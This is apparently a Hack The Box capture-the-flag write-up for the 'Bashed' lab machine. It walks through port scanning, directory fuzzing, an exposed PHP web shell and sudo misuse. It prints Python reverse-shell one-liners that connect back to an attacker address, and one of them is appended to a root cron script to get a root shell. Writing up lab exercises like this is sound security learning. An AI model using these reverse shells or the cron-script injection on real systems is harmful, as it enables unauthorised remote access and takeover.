# Bashed-HTB
Bashed is a Linux machine that is rated as easy, so let's start :)

# Recon
I started by runing nmap scan on the machine.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.10.68                  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 20:47 EDT
Nmap scan report for 10.10.10.68
Host is up (0.048s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds
```
## ffuf
Using ffuf to fuze for web directories.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.68/FUZZ                                                                                                                                130 ⨯

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.68/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 312, Words: 20, Lines: 10]
php                     [Status: 301, Size: 308, Words: 20, Lines: 10]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10]
dev                     [Status: 301, Size: 308, Words: 20, Lines: 10]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10]
```
So inside ```/dev``` there is two intresting files, by opening ```phpbash.php```, we get a shell

![image1]()

![image2]()

# User Flag
I prefer to get a shell rather than use the web shell, so here is how you can get a reverse shell using python:

```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip_address>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

And we got a shell:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4444                             
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.68] 42552
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Let's upgrade it now:
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/var/www/html/dev$
```
And we can get User Flag:
```
www-data@bashed:/home/arrexel$ cat user.txt
cat user.txt
2c281f318...957c7147bfc1
```

# Root Flag
By running ```sudo -l``` you can see that we can get a shell as ```scriptmanager```
```
www-data@bashed:/home/arrexel$ sudo -l
sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Getting a shell as ```scriptmanager```:
```
www-data@bashed:/home/arrexel$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/home/arrexel$ id
id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

```scriptmanager``` have access to ```/script``` dir.
```
scriptmanager@bashed:/scripts$ ls
ls
test.py  test.txt
```
So I assumed that root is running a cron job on that dir, so I decided to modify test.py and add a reverse shell.
```
scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip_address>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
```

And after some minutes I got my reverse shell as root:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 5555                             
listening on [any] 5555 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.68] 45418
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
Now we can get root flag:
```
# cat root.txt
cc4f0afe...29674a8e2
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
